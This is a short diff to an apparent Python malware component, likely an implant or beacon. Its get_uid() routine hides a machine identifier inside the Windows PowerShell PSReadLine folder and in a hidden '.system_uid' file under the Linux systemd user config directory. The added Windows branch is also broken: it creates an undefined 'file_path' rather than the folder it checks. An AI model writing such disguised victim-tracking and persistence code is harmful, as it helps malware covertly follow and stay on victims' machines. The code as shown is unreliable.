@@ -13,7 +13,15 @@ def run(url):
     def get_uid():
         if platform.system() == "Windows":
             user = getpass.getuser()
-            windows_path=f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Vault\\uid.txt"
+            windows_path=f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine\\uid.txt"
+
+            if not os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Powershell\\PSReadLine"):
+                # Create the folder
+                os.makedirs(file_path)
+                print(f"Folder '{file_path}' created.")
+            else:
+                print(f"Folder '{file_path}' already exists.")
+                
             if os.path.exists(windows_path):
                 with open(windows_path,"r",) as f:
                     return f.read().strip()
@@ -30,6 +38,10 @@ def run(url):
 
         if platform.system() == "Linux":
             user = getpass.getuser()
+
+            if not os.path.exists(f'/home/{user}/.config/systemd/user'):
+                os.makedirs(f'/home/{user}/.config/systemd/user')
+
             path = f"/home/{user}/.config/systemd/user/.system_uid"
             if os.path.exists(path):
                 with open(path, "r") as f:
